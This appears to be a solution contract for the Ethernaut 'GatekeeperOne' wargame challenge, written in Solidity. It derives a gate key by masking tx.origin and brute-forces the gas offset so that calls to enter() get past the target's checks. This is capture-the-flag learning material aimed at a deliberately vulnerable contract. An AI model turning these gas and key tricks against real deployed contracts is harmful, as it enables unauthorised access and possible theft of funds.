//SPDX-License-Identifer: MIT

pragma solidity ^0.8.24;

import {GatekeeperOne} from "../src/GateKeeperOne.sol";

contract AttackGatekeeperOne {
    function attack(address target) external {
        //Gate2
        bytes8 gateKey = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        //Gate3
        for (uint256 i = 0; i <= 8191; i++) {
            (bool success, ) = target.call{gas: 800000 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
